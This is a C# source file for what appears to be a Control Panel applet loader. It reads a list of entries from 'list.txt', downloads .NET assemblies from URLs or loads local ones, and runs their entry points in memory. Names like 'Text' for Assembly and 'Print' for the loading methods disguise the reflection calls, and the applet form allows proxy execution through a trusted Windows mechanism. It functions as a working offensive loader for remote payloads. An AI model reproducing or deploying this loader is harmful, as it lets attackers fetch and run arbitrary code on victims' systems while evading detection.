using System;
using System.Runtime.InteropServices;
using System.IO;
using Text = System.Reflection.Assembly;
using System.Linq;

namespace CPL
{
    public class List
    {
        const uint ATTACH_PARENT_PROCESS = 0x0ffffffff;  // default value if not specifing a process ID
        const int ERROR_ACCESS_DENIED = 5; // process was already attached to another console
        public static string files = "list.txt";

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AttachConsole(uint dwProcessID);

        [DllImport("kernel32", SetLastError = true)]
        static extern bool AllocConsole();
        private static void AllocateConsole()
        {
            //
            // the following should only be used in a non-console application type (C#)
            // (since a console is allocated/attached already when you define a console app.. :) )
            //
            if (!AttachConsole(ATTACH_PARENT_PROCESS) && Marshal.GetLastWin32Error() == ERROR_ACCESS_DENIED)
            {
                // A console was not allocated, so we need to make one.
                if (!AllocConsole())
                {
                    Console.WriteLine("A console could not be allocated, sorry!");
                    throw new Exception("Console Allocation Failed");
                }
                else
                {
                    Console.WriteLine("Is Attached, press a key...");
                    Console.ReadKey(true);
                    // you now may use the Console.xxx functions from .NET framework
                    // and they will work as normal
                }
            }
            else
                Console.WriteLine("Error allocating console, no output will be shown!");
        }

        // Invoke stuff
        static void Print(byte[] str, string[] args)
        {
            Text text = Text.Load(str);
            Print(text, args);
        }
        static void Print(string file, string[] args)
        {
            Text text = Text.LoadFile(file);
            Print(text, args);
        }
        static void Print(Text text, string[] args)
        {
            text.EntryPoint.Invoke(null, new object[] { args });
        }

        // Process file
        static int CrossReflect()
        {
            // Check if list.txt config file exists           
            string configfile = Path.GetFullPath(files);
            if (!File.Exists(files))
            {
                Console.WriteLine("[-] File not found.");
                return -1;
            }
            Console.WriteLine("[+] {0} found, processing list of files", files);
            string[] executables = File.ReadAllLines(configfile);

            // Process each line
            foreach (string file in executables)
            {
                string escape = "%%THIS%%";
                Console.WriteLine("[+] Processing {0}", file);

                // Skip commented lines
                if (file.StartsWith("#"))
                    continue;

                string replaced = file.Replace("\\ ", escape); // Escape spaces in arguments
                string[] words = replaced.Split(' '); // Parse line <exe> <arg 1> <arg 2> ... <arg n

                // Local file found
                if (File.Exists(words[0]))
                {
                    Print(words[0], words.Skip(1).ToArray());
                    continue;
                }

                // Build new channel for each line
                Channel chan = new Channel();
                int skip = chan.parse(words);
                string[] args = words.Skip(skip).ToArray(); // get args

                byte[] text = chan.fetch(chan.url, 3, 1);
                Print(text, args);

                Console.WriteLine("[+] Finished");
            }

            Console.WriteLine("[+] Done executing");
            return 0;
        }

        [DllExport]
        public static int CPlApplet(int a, int b, string c, int d)
        {
            AllocateConsole();

            return CrossReflect();
        }

    }

}